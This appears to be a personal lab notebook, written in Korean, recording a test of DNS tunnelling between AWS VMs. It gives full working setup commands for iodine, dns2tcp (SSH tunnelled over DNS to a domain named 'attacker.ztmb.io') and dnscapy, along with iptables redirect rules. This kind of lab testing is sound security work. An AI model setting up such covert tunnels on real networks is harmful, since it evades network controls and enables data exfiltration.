---
date: 2024-06-14
---
## TTD

- [x] VM 생성
	- domain 등록은 안함; `/etc/host` 로 조지자
- [x] L3 (ICMP ping) 확인
- [ ] ncat 둘 다 띄워서 통신 되나 확인
	- [ ] 853 port 확인
	- [ ] 853 port 가 아닌 거 열어서 확인
- [ ] DNS tunnel 확인
	- [Iodine](https://github.com/yarrick/iodine?tab=readme-ov-file#quickstart)

## 삽질

- subnet 에 포함되는 route table entry 를 terraform 으로 추가하는것은 안됨
- ec2 에 eip 추가
	- https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eip#multiple-eips-associated-with-a-single-network-interface
- ip_forward
	- https://unix.stackexchange.com/a/449474
- source_dest_check 를 false 로 해야 함
	- https://serverfault.com/a/810509
	- https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_interface

## Iodine

```bash
wget -qO- https://code.kryo.se/iodine/iodine-0.8.0.tar.gz | tar -xz \
  && cd iodine-0.8.0 \
  && make
```

```bash
sudo ./iodine-0.8.0/bin/iodined -f 10.0.0.1 -P toor ztmb.io
```

```bash
sudo ./iodine-0.8.0/bin/iodine -f -r 172.16.20.10 ztmb.io -P toor
```

- Ubuntu 에서 설치시 추가적으로 필요한 것

```bash
sudo apt-get install -y gcc make pkg-config libz-dev ifconfig
```

- golang

```bash
wget -qO- https://go.dev/dl/go1.22.4.linux-amd64.tar.gz | sudo tar -xzC /usr/local
  export PATH=$PATH:/usr/local/go/bin
```


- `bot` conf - 이걸을 이용해 0x20 키고 끌 수 있음
- 키기

```bash
sudo iptables -t nat -A OUTPUT -d 172.16.20.10 -p udp --dport 53 -j DNAT --to-destination 127.0.0.1:20053
```

- 끄기

```bash
sudo iptables -t nat -F
```

## dns2tcp 

- 참고
	- https://www.aldeid.com/wiki/Dns2tcp
- install

```bash
wget -qO- https://github.com/alex-sector/dns2tcp/archive/refs/tags/v0.5.2.tar.gz | tar -xzv
cd dns2tcp-0.5.2
./configure
make
```

- server

```bash
sudo mkdir -pv /root/dns2tcp
cat <<END > .dns2tcpdrc
listen = 0.0.0.0
port = 53
user=ec2-user
chroot = /root/dns2tcp
pid_file = /var/run/dns2tcp.pid
domain = attacker.ztmb.io
key = secretkey
resources = ssh:127.0.0.1:22
END
```

```bash
sudo ./server/dns2tcpd -f .dns2tcpdrc -F -d3
```

- client

```bash
cat <<END > .dns2tcprc
domain = attacker.ztmb.io
resource = ssh
local_port = 2139
key = secretkey
END
```

```bash
./client/dns2tcpc -f .dns2tcprc
```

## dnscapy

```bash
sudo apt-get install -y unzip python3 python3-pip python3-scapy
```

```bash
pip install scapy
```

```bash
wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/dnscapy/dnscapy-0-99b.zip
unzip dnscapy-0-99b.zip
```